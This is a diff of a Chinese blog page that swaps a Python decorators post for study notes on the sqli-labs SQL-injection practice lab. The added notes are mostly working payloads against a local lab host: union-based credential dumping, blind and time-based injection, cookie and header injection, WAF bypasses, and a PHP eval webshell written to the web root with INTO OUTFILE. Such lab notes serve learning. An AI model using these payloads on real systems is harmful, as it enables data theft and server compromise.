@@ -4,13 +4,11 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="函数装饰器和闭包, python bigdata docker spark linux django">
+    <meta name="keywords" content="sqli-labs注入学习, python bigdata docker spark linux django">
    <meta name="baidu-site-verification" content="xB7VApzxXd" />
-    <meta name="description" content="装饰器基本知识装饰器是可调用的对象, 参数是另一个函数(被装饰的函数), 可以将函数返回或者替换
-装饰器调用时机在函数定义后就直接运行(加载时即开始运行)
-装饰器返回的函数与通过参数传入的相同
-闭包def average():
-    se">
+    <meta name="description" content="
+查库  select schema_name from information_schema.schemata;
+查表  select table_name from information_schema.tables where tab">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +16,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>函数装饰器和闭包 | ajin的博客</title>
+    <title>sqli-labs注入学习 | ajin的博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,13 +308,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        函数装饰器和闭包
+                        sqli-labs注入学习
                     </div>
                 </div>
             </div>
@@ -428,8 +426,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/python/">
-                                <span class="chip bg-color">python</span>
+                            <a href="/tags/%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">安全</span>
                             </a>
                         
                     </div>
@@ -440,8 +438,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/python/" class="post-category">
-                                python
+                            <a href="/categories/%E5%AE%89%E5%85%A8/" class="post-category">
+                                安全
                             </a>
                         
                     </div>
@@ -453,7 +451,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-12-27
+                    2020-11-14
                 </div>
                 
 
@@ -462,14 +460,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    689
+                    1.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    5 分
                 </div>
                 
 				
@@ -485,74 +483,100 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="装饰器基本知识"><a href="#装饰器基本知识" class="headerlink" title="装饰器基本知识"></a>装饰器基本知识</h1><p>装饰器是可调用的对象, 参数是另一个函数(被装饰的函数), 可以将函数返回或者替换</p>
-<h1 id="装饰器调用时机"><a href="#装饰器调用时机" class="headerlink" title="装饰器调用时机"></a>装饰器调用时机</h1><p>在函数定义后就直接运行(加载时即开始运行)</p>
-<p>装饰器返回的函数与通过参数传入的相同</p>
-<h1 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h1><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">average</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    series <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
-    <span class="token keyword">def</span> <span class="token function">make_average</span><span class="token punctuation">(</span>new_value<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># 1</span>
-        series<span class="token punctuation">.</span>append<span class="token punctuation">(</span>new_value<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># 2</span>
-        <span class="token keyword">return</span> sum<span class="token punctuation">(</span>series<span class="token punctuation">)</span> <span class="token operator">/</span> len<span class="token punctuation">(</span>series<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 3</span>
-    <span class="token keyword">return</span> make_average                     <span class="token comment" spellcheck="true"># 4</span>
-
-avg <span class="token operator">=</span> average<span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span>avg<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 运行顺序 4->1->2->3</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span>avg<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>Series变量是一个自由变量, 意思是未在本地作用域绑定的变量(python的变量命名法和作用域), 不可变类型不可以改变其内容, 例如数字, 可变类型可以改变, 如果进行不可变变量更新结果, 会隐式创建一个局部变量</p>
-<h1 id="nonlocal"><a href="#nonlocal" class="headerlink" title="nonlocal"></a>nonlocal</h1><p>nonlocal声明作用是把变量标记为自由变量, 即使在函数中赋予了新值, 也会变成自由变量</p>
-<h1 id="标准库中的装饰器"><a href="#标准库中的装饰器" class="headerlink" title="标准库中的装饰器"></a>标准库中的装饰器</h1><ol>
-<li>functools.wraps(func)装饰器可以处理关键词参数, 并且会将被装饰的name和doc参数复制到里层函数</li>
-<li>functools.lru_cache(maxsize, typed), 这个装饰器可以缓存之前的结果, 用来优化递归等, maxsize指定保存多少个结果, 并且需要是2的幂, typed为True, 会将不同类型的结果分开保存, 使用字段存储结果, 所以被装饰的函数的所有参数也应该是可散列的(原子不可变类型(str, 数值, bytes)都是可散列类型)</li>
-<li>singledispatch装饰器可以实现类似于重载的效果, 具体查文档</li>
+                <ol>
+<li>查库  <code>select schema_name from information_schema.schemata;</code></li>
+<li>查表  <code>select table_name from information_schema.tables where table_schema="security";</code></li>
+<li>查列  <code>select column_name from information_schema.columns where table_name="security";</code></li>
+<li>查字段 <code>select username, password from security.users;</code></li>
 </ol>
-<h1 id="叠加装饰器执行顺序是从内到外"><a href="#叠加装饰器执行顺序是从内到外" class="headerlink" title="叠加装饰器执行顺序是从内到外"></a>叠加装饰器执行顺序是从内到外</h1><h1 id="参数化装饰器"><a href="#参数化装饰器" class="headerlink" title="参数化装饰器"></a>参数化装饰器</h1><p>参数化装饰器后, 装饰器必须作为函数调用(@register())</p>
-<p>如果不适用<code>@</code>语法, 则调用方式为</p>
-<pre class="line-numbers language-python"><code class="language-python">registry <span class="token operator">=</span> set<span class="token punctuation">(</span><span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span>active <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">def</span> <span class="token function">decorate</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"running register(active=%s) ->decorate(%s)"</span> <span class="token operator">%</span><span class="token punctuation">(</span>active<span class="token punctuation">,</span> func<span class="token punctuation">)</span><span class="token punctuation">)</span>
-        <span class="token keyword">if</span> active<span class="token punctuation">:</span>
-            registry<span class="token punctuation">.</span>add<span class="token punctuation">(</span>func<span class="token punctuation">)</span>
-        <span class="token keyword">else</span><span class="token punctuation">:</span>
-            registry<span class="token punctuation">.</span>discard<span class="token punctuation">(</span>func<span class="token punctuation">)</span>
-        <span class="token keyword">return</span> func
-    <span class="token keyword">return</span> decorate
-
-@register<span class="token punctuation">(</span>active<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
-<span class="token keyword">def</span> <span class="token function">f1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"running f1"</span><span class="token punctuation">)</span>
-
-@register<span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token keyword">def</span> <span class="token function">f2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"running f2"</span><span class="token punctuation">)</span>
-
-<span class="token keyword">def</span> <span class="token function">f3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"running f3"</span><span class="token punctuation">)</span>
-
-<span class="token keyword">print</span><span class="token punctuation">(</span>register<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span>f3<span class="token punctuation">)</span><span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span>register<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span>f2<span class="token punctuation">)</span><span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span>registry<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h1 id="装饰器金字塔是多包一个外层函数-将实际函数放在中间层-最外层是参数-最里层是函数参数"><a href="#装饰器金字塔是多包一个外层函数-将实际函数放在中间层-最外层是参数-最里层是函数参数" class="headerlink" title="装饰器金字塔是多包一个外层函数, 将实际函数放在中间层, 最外层是参数, 最里层是函数参数"></a>装饰器金字塔是多包一个外层函数, 将实际函数放在中间层, 最外层是参数, 最里层是函数参数</h1><pre class="line-numbers language-python"><code class="language-python">default_fmt <span class="token operator">=</span> <span class="token string">"[{elapsed:0.8f}s] {name}({args}) -> {result}"</span>
-
-<span class="token keyword">def</span> <span class="token function">clock</span><span class="token punctuation">(</span>fmt <span class="token operator">=</span> default_fmt<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">def</span> <span class="token function">decorate</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token keyword">def</span> <span class="token function">clocked</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
-            t0 <span class="token operator">=</span> time<span class="token punctuation">.</span>perf_counter<span class="token punctuation">(</span><span class="token punctuation">)</span>
-            result <span class="token operator">=</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
-            elapsed <span class="token operator">=</span> time<span class="token punctuation">.</span>perf_counter<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> t0
-            name <span class="token operator">=</span> func<span class="token punctuation">.</span>__name__
-            arg_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
-            <span class="token keyword">if</span> args<span class="token punctuation">:</span>
-                arg_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">", "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>str<span class="token punctuation">(</span>arg<span class="token punctuation">)</span> <span class="token keyword">for</span> arg <span class="token keyword">in</span> args<span class="token punctuation">)</span><span class="token punctuation">)</span>
-            <span class="token keyword">if</span> kwargs<span class="token punctuation">:</span>
-                pairs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"%s=%r"</span> <span class="token operator">%</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> w<span class="token punctuation">)</span> <span class="token keyword">for</span> k<span class="token punctuation">,</span> w <span class="token keyword">in</span> sorted<span class="token punctuation">(</span>kwargs<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
-                arg_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">", "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>pairs<span class="token punctuation">)</span><span class="token punctuation">)</span>
-            arg_str <span class="token operator">=</span> <span class="token string">", "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>arg_list<span class="token punctuation">)</span>
-            <span class="token keyword">print</span><span class="token punctuation">(</span>fmt<span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token operator">**</span>locals<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-            <span class="token keyword">return</span> result
-        <span class="token keyword">return</span> clocked
-    <span class="token keyword">return</span> decorate<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h4><ol>
+<li><p>解密， id包裹方式  ‘1’</p>
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> security<span class="token punctuation">.</span>users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1'</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span>
+payload  id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">1</span> <span class="token comment" spellcheck="true">--+  解释，第一个引号用来测试是否又注入点， order by本来用来排序列，按数字来可以探测列数量，最后在注释来闭合sql   </span>
+payload  id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token comment" spellcheck="true">--+  解释， id=-1是用来报错的， 因为只有一行能够回显，所有前面报错后面才能回显，来寻找回显点</span>
+payload  http:<span class="token comment" spellcheck="true">//192.168.32.128/Less-1/?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479 --+  解释，这个16进制是为了不引入多余的引号</span>
+payload http:<span class="token comment" spellcheck="true">//192.168.32.128/Less-1/?id=-1' union select 1,2,group_concat(concat_ws('~', username, password)) from security.users --+  爆出所有账户密码</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</li>
+<li><p>系统函数</p>
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token keyword">system_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  当前管理用户
+<span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  当前数据库
+<span class="token keyword">select</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 版本信息
+<span class="token keyword">select</span> @<span class="token variable">@datadir</span><span class="token punctuation">;</span> mysql安装路径
+<span class="token keyword">select</span> @<span class="token variable">@version_compile_os</span><span class="token punctuation">;</span> 系统os版本
+group_concat<span class="token punctuation">(</span><span class="token punctuation">)</span>  将所有的数据连接拼接
+concat_ws<span class="token punctuation">(</span><span class="token string">'~'</span><span class="token punctuation">,</span> A<span class="token punctuation">,</span> B<span class="token punctuation">)</span>
+<span class="token keyword">select</span> <span class="token keyword">left</span><span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">'sec'</span><span class="token punctuation">;</span>  截取几位，来猜测， 正确为<span class="token number">1</span>
+<span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">regexp</span> <span class="token string">'root'</span><span class="token punctuation">;</span>  正则匹配<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</li>
+</ol>
+<h4 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h4><ol>
+<li>解密<pre class="line-numbers language-sql"><code class="language-sql">payload id<span class="token operator">=</span><span class="token number">1</span> xxx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+</ol>
+<h4 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h4><ol>
+<li>解密， id包裹方式  (‘1’)<pre class="line-numbers language-sql"><code class="language-sql">payload id<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">)</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token comment" spellcheck="true">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+</ol>
+<h4 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h4><ol>
+<li>解密， id包裹方式  (“1”)</li>
+</ol>
+<h4 id="less-5-布尔注入，-主要用于没有回显的方式"><a href="#less-5-布尔注入，-主要用于没有回显的方式" class="headerlink" title="less-5 布尔注入， 主要用于没有回显的方式"></a>less-5 布尔注入， 主要用于没有回显的方式</h4><ol>
+<li>解密<pre class="line-numbers language-sql"><code class="language-sql">payload  id<span class="token operator">=</span><span class="token number">10</span><span class="token string">' and left((database()),2)='</span>se' <span class="token comment" spellcheck="true">--+  解释， 这段的意思是一个字母一个字母进行爆破数据库名称</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+</li>
+</ol>
+<h4 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h4><pre class="line-numbers language-sql"><code class="language-sql">payload  <span class="token keyword">select</span> <span class="token string">"&lt;?php @eval($_POST['pass']);?>"</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">"/var/www/html/test.php"</span><span class="token punctuation">;</span>  配合webshell使用<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>读文件</p>
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token string">"/var/www/html/index.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="less-7，判断数据库，以及可以构造永真式"><a href="#less-7，判断数据库，以及可以构造永真式" class="headerlink" title="less-7，判断数据库，以及可以构造永真式"></a>less-7，判断数据库，以及可以构造永真式</h4><p>payload  <code>http://192.168.32.128/Less-7/?id=-1')) union select 1,2,"&lt;?php @eval($_POST['pass']);?&gt;" into outfile '/var/www/html/a.php'--+</code></p>
+<p>payload  <code>select if(ascii(substr((select database()),1,1)) &gt; 10, 2, 3);</code></p>
+<h4 id="less-8-基于时间盲注-判断是否可以注入"><a href="#less-8-基于时间盲注-判断是否可以注入" class="headerlink" title="less-8 基于时间盲注,判断是否可以注入"></a>less-8 基于时间盲注,判断是否可以注入</h4><p>payload  <code>http://192.168.32.128/Less-8/?id=1' and sleep(3) --+</code></p>
+<p>payload  <code>http://192.168.32.128/Less-8/?id=1' and if(length(database())=7,1,sleep(5)) --+</code></p>
+<p>payload  <code>http://192.168.32.128/Less-8/?id=1' and if(ascii(substr((select database()),1,1))&gt;115,1,sleep(5)) --+</code></p>
+<h4 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h4><p>payload <code>uname=admin' or 1=1 #&amp; passwd=admin &amp; submit=Submit</code></p>
+<p><code>-qing' union select 1,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata)#</code></p>
+<p><code>-qing' union select 1,2#</code></p>
+<p><code>admin' union select 1,2 #</code></p>
+<p>解释： post使用–+注释是无效的，要使用#注释</p>
+<h4 id="常见包裹方式"><a href="#常见包裹方式" class="headerlink" title="常见包裹方式"></a>常见包裹方式</h4><ol>
+<li>‘</li>
+<li>“</li>
+<li>‘)</li>
+<li>‘))</li>
+<li>“)</li>
+<li>“))<blockquote>
+<p>然后使用or语句进行时间注入尝试</p>
+</blockquote>
+</li>
+</ol>
+<h4 id="xpath注入"><a href="#xpath注入" class="headerlink" title="xpath注入"></a>xpath注入</h4><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">select</span> username <span class="token keyword">from</span> security<span class="token punctuation">.</span>users <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="less-18"><a href="#less-18" class="headerlink" title="less-18"></a>less-18</h4><p>请求头注入<br>payload <code>' or updatexml(1, concat(0x7e, (database()), 0x7e), 1)  or '1'='1</code><br>payload <code>' or updatexml(1, concat(0x7e, (database()), 0x7e), 1), '', '')#</code></p>
+<h4 id="less-20"><a href="#less-20" class="headerlink" title="less-20"></a>less-20</h4><p>cookie注入</p>
+<p>payload  <code>' union select 1,2,database()#</code></p>
+<h4 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h4><p>cookie注入</p>
+<p>payload  <code>') union select 1,2,database()#</code></p>
+<h4 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h4><p>特殊注释符</p>
+<p>payload  <code>id=-1' union select 1,2,database() ;%00</code></p>
+<h4 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h4><ol>
+<li>mysql内联注释  <ol>
+<li>select 1,2 /**/,3;</li>
+<li>select /<em>!1</em>/,2,3;</li>
+</ol>
+</li>
+<li>空白符绕过</li>
+<li>mysql特殊语法绕过  <code>select {x schema_name} from {x information_schema.schemata};</code></li>
+<li>双写字符绕过(16进制)</li>
+</ol>
+<h4 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h4><p>payload  <code>http://192.168.32.128/Less-26/?id=1' %a0 %a0 %a0 oorrder %a0 by%a0 4 ;%00</code></p>
+<h4 id="less-27"><a href="#less-27" class="headerlink" title="less-27"></a>less-27</h4><p>payload  <code>http://192.168.32.128/Less-27/?id=1111111'   uNion%a0 sElect%a0 1,2,3;%00</code></p>
+<h4 id="less-28"><a href="#less-28" class="headerlink" title="less-28"></a>less-28</h4><p>考点为括号包裹<br>payload  <code>http://192.168.32.128/Less-28/?id=1' %a0 or %a0 '1'='1</code><br>payload  <code>http://192.168.32.128/Less-28/?id=111111111') %a0  union %a0 select %a0 1,2,3 ;%00</code></p>
+<h4 id="less-29"><a href="#less-29" class="headerlink" title="less-29"></a>less-29</h4><p>双id<br>payload  <code>http://192.168.32.128/Less-29/?id=1&amp;id=-3' union select %a0 1,2,3 --+</code></p>
+<h4 id="less-32"><a href="#less-32" class="headerlink" title="less-32"></a>less-32</h4><p>宽字节注入，转义对于sql语法是没有影响的, 主要使用场景是在对字符进行转义的时候，添加一个字符对其进行两次转义失效， 意思是他多产生了转义符导致转义符失效，然后在mysql中，转义符是无效的，真实数据后面的就会被忽略，成功闭合</p>
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> security<span class="token punctuation">.</span>users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1\'1'</span><span class="token punctuation">;</span> 依然是正确的结果<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>%aa%5c’  =&gt; %aa%5c%27  =&gt; %aa  %5c%5c  %5c%27  =&gt;  %aa%5c   %5c  %5c  %27  =&gt; 汉字  \  \ ‘</p>
+<h4 id="less-33"><a href="#less-33" class="headerlink" title="less-33"></a>less-33</h4><p>宽字节注入会html进行转码，使用burpsuite进行修改</p>
+<h4 id="less-38"><a href="#less-38" class="headerlink" title="less-38"></a>less-38</h4><p>堆叠注入，意思是在sql结束后在加入一个sql语句来进行操作</p>
+<h4 id="一句话木马补充"><a href="#一句话木马补充" class="headerlink" title="一句话木马补充"></a>一句话木马补充</h4><pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token string">'&lt;?php @eval($_POST[pass]);?>'</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'/home/test/test1.txt'</span> <span class="token keyword">lines</span> <span class="token keyword">terminated by</span> <span class="token string">"123"</span><span class="token punctuation">;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -596,7 +620,7 @@ avg <span class="token operator">=</span> average<span class="token punctuation"
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://www.ajin.cloud/2019/12/27/han-shu-zhuang-shi-qi-he-bi-bao/">https://www.ajin.cloud/2019/12/27/han-shu-zhuang-shi-qi-he-bi-bao/</a>
+                    <a href="https://www.ajin.cloud/2020/11/14/sqli-labs-zhu-ru-xue-xi/">https://www.ajin.cloud/2020/11/14/sqli-labs-zhu-ru-xue-xi/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -634,8 +658,8 @@ avg <span class="token operator">=</span> average<span class="token punctuation"
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/python/">
-                                    <span class="chip bg-color">python</span>
+                                <a href="/tags/%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">安全</span>
                                 </a>
                             
                         </div>
@@ -676,9 +700,9 @@ avg <span class="token operator">=</span> average<span class="token punctuation"
 
 <script type="text/javascript">
     disqus_config = function () {
-        this.page.url = 'https://www.ajin.cloud/2019/12/27/han-shu-zhuang-shi-qi-he-bi-bao/';
-        this.page.identifier = '/2019/12/27/han-shu-zhuang-shi-qi-he-bi-bao/';
-        this.page.title = '函数装饰器和闭包';
+        this.page.url = 'https://www.ajin.cloud/2020/11/14/sqli-labs-zhu-ru-xue-xi/';
+        this.page.identifier = '/2020/11/14/sqli-labs-zhu-ru-xue-xi/';
+        this.page.title = 'sqli-labs注入学习';
     };
     let disqus_shortname = '';
 
@@ -701,46 +725,50 @@ avg <span class="token operator">=</span> average<span class="token punctuation"
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2019/12/27/dui-xiang-yin-yong/">
+                <a href="/2020/11/14/sqli-labs-zhu-ru-xue-xi/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="对象引用">
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="sqli-labs注入学习">
                         
-                        <span class="card-title">对象引用</span>
+                        <span class="card-title">sqli-labs注入学习</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            变量不是盒子, 是引用每个变量都有标识, 类型和值, 对象一旦创建, 他的标识绝不会变is比较的是变量的标识(id), ==比较的是值, x is not None一般的复制是浅复制(复制的是对象的引用), 使用copy.deepcopy才
+                            
+查库  select schema_name from information_schema.schemata;
+查表  select table_name from information_schema.tables where tab
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2019-12-27
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-14
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/python/" class="post-category">
-                                    python
+                            <a href="/categories/%E5%AE%89%E5%85%A8/" class="post-category">
+                                    安全
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/python/">
-                        <span class="chip bg-color">python</span>
+                    <a href="/tags/%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">安全</span>
                     </a>
                     
                 </div>
@@ -754,36 +782,32 @@ avg <span class="token operator">=</span> average<span class="token punctuation"
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/12/21/yi-deng-han-shu/">
+                <a href="/2020/09/08/an-quan-zhi-mi-guan-chu-tan/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="一等函数">
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="安全之蜜罐初探">
                         
-                        <span class="card-title">一等函数</span>
+                        <span class="card-title">安全之蜜罐初探</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            sorted使用
-sorted是没有返回值的
-sorted的key是一个函数, 定义后使用, 例如使用sorted排序列表sorted(s.items(), key=lambda x:x[1])
-
-高阶函数
